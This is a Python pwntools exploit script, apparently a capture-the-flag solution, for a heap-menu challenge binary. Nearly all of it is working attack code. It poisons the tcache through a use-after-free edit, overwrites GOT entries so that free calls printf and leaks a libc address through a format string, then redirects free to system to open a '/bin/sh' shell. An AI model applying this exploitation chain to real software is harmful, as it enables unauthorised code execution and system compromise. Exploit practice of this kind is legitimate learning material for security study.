#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("chall_patched")
libc = ELF("./libc.so.6")

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("address", 12345)
    else:
        return process(elf.path)

# Plan:
# Free a chunk and then edit it, overwriting the fd to a got entry and taking control
# Binary is not compiled with pie and has no relro

# Addresses
fake = 0x40350d
# Functions
def add(idx: int, size: int):
    io.sendlineafter(b">> ", b"1")
    io.sendlineafter(b">> ", str(idx).encode())
    io.sendlineafter(b">> ", str(size).encode())

def change(idx: int, size: int):
    io.sendlineafter(b">> ", b"2")
    io.sendlineafter(b">> ", str(idx).encode())
    io.sendlineafter(b">> ", str(size).encode())

def delete(idx: int):
    io.sendlineafter(b">> ", b"3")
    io.sendlineafter(b">> ", str(idx).encode())

def edit(idx: int, data: bytes):
    io.sendlineafter(b">> ", b"4")
    io.sendlineafter(b">> ", str(idx).encode())
    io.sendlineafter(b">> ", data)


io = start()


add(0, 0x68)
add(1, 0x68)
delete(0) # put into tcache
delete(1) # put into tcache

edit(1, p64(elf.got['__gmon_start__']+8))
add(2, 0x68)
edit(2, b"%33$p")
add(3, 0x68)
edit(3, p64(elf.plt['printf'])*5)

delete(2) # printf on 2 
leak = io.recvline().strip()
leak = int(leak, 16) - 0x24083 # offset
log.info("Libc base: %s" % hex(leak))
libc.address = leak

system = libc.sym.system

edit(2, b"/bin/sh\0") # make 2 contain binsh
edit(3, p64(system)*5) # write system instead of printf
delete(2) # system("/bin/sh")






io.interactive()
